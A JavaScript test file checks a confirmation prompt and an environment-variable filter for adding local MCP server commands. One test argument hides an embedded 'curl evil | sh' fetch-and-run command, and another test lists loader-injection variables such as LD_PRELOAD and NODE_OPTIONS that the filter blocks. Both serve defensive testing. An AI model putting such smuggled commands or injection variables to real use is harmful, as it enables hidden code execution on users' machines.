'use strict';

const { test } = require('node:test');
const assert = require('node:assert/strict');

const { describeLocalCommand, elide, ARGS_BEFORE_MORE } = require('./local-command-confirm');
const { normalizeLocalCommand, isBlockedEnvName } = require('./mcp-connections');

test('every argument is on its own line and each variable shows KEY=value', () => {
  const { message, detail } = describeLocalCommand({
    name: 'Notebook',
    command: '/usr/local/bin/npx',
    args: ['-y', '@acme/notes-mcp', '--workspace', 'Core team'],
    env: { NOTES_TOKEN: 'tok_live_123456', REGION: 'eu' },
  });
  assert.equal(message, 'Add "Notebook" as a local MCP server?');
  const lines = detail.split('\n');
  assert.ok(lines.includes('Program: /usr/local/bin/npx'));
  assert.ok(lines.includes('Arguments (4):'));
  assert.ok(lines.includes('  1. -y'));
  assert.ok(lines.includes('  2. @acme/notes-mcp'));
  assert.ok(lines.includes('  3. --workspace'));
  assert.ok(lines.includes('  4. "Core team"'));
  assert.ok(lines.includes('Environment variables (2):'));
  assert.ok(lines.includes('  NOTES_TOKEN=tok_live_123456'));
  assert.ok(lines.includes('  REGION=eu'));
  assert.ok(detail.endsWith('Only add programs you trust.'));
});

test('the name goes through the connection cleaner; no name has a plain headline', () => {
  assert.equal(describeLocalCommand({ name: ' Note\u0000book\n', command: 'x' }).message, 'Add "Notebook" as a local MCP server?');
  assert.equal(describeLocalCommand({ name: `"${'n'.repeat(200)}`, command: 'x' }).message.length, 'Add "" as a local MCP server?'.length + 80);
  assert.equal(describeLocalCommand({ command: 'x' }).message, 'Add a local MCP server?');
  assert.ok(describeLocalCommand({ command: 'x' }).detail.includes('Arguments: none'));
});

test('long values are elided in the middle, say their length, and no argument is dropped', () => {
  const long = `${'a'.repeat(500)}; curl evil | sh; ${'b'.repeat(500)}`;
  const shown = elide(long, 160);
  assert.ok(shown.length < 200);
  assert.ok(shown.startsWith('a'.repeat(20)));
  assert.ok(shown.endsWith(`${'b'.repeat(20)} (${long.length} characters)`));
  assert.equal(elide('short', 160), 'short');

  const args = Array.from({ length: 64 }, (_, i) => `--flag-${i + 1}`);
  const { detail } = describeLocalCommand({ command: 'tool', args, env: { KEY: 'v'.repeat(300) } });
  for (let i = 1; i <= 64; i += 1) assert.ok(detail.includes(`\n  ${i}. --flag-${i}`), `argument ${i} is shown`);
  assert.ok(detail.includes(`  +${64 - ARGS_BEFORE_MORE} more arguments:`));
  assert.ok(detail.includes('KEY=vvvv'));
  assert.ok(detail.includes('(300 characters)'));
  assert.ok(!detail.includes('v'.repeat(100)), 'the value is elided');
});

test('control characters in an argument cannot fake extra lines', () => {
  const { detail } = describeLocalCommand({ command: 'tool', args: ['safe\u001b[2Jfake', 'tab\there'] });
  assert.ok(detail.includes('\n  1. safe�[2Jfake\n'));
  assert.ok(detail.includes('\n  2. tab�here\n'));
  assert.equal(detail.split('\n').filter((l) => /^ {2}\d+\. /.test(l)).length, 2, 'exactly two argument lines');
});

test('loader and registry variables are refused by the normaliser, case-insensitively', () => {
  const blocked = [
    'NODE_OPTIONS', 'NODE_EXTRA_CA_CERTS', 'npm_config_registry', 'NPM_CONFIG_SCRIPT_SHELL', 'LD_PRELOAD', 'LD_LIBRARY_PATH',
    'DYLD_INSERT_LIBRARIES', 'PYTHONPATH', 'PYTHONSTARTUP', 'pythonhome', 'BASH_ENV', 'ENV', 'PROMPT_COMMAND', 'PERL5OPT',
    'RUBYOPT', 'JAVA_TOOL_OPTIONS', '_JAVA_OPTIONS', 'GIT_SSH_COMMAND', 'GIT_SSH', 'GIT_CONFIG_PARAMETERS', 'GIT_CONFIG_KEY_0',
    'SSH_ASKPASS', 'ComSpec',
  ];
  for (const name of blocked) {
    assert.equal(isBlockedEnvName(name), true, name);
    assert.throws(() => normalizeLocalCommand({ command: 'tool', env: { [name]: 'x' } }), (e) => e.code === 'env-not-allowed' && e.variable === name, name);
  }
  for (const name of ['API_KEY', 'NOTES_TOKEN', 'PATH', 'HOME', 'GIT_AUTHOR_NAME', 'GITHUB_TOKEN', 'SSH_AUTH_SOCK', 'ENVIRONMENT', 'NODE_ENV', 'PYTHONISTA_TOKEN'.replace('PYTHONISTA', 'SNAKE')]) {
    assert.equal(isBlockedEnvName(name), false, name);
    assert.deepEqual(normalizeLocalCommand({ command: 'tool', env: { [name]: 'x' } }).env, { [name]: 'x' });
  }
});
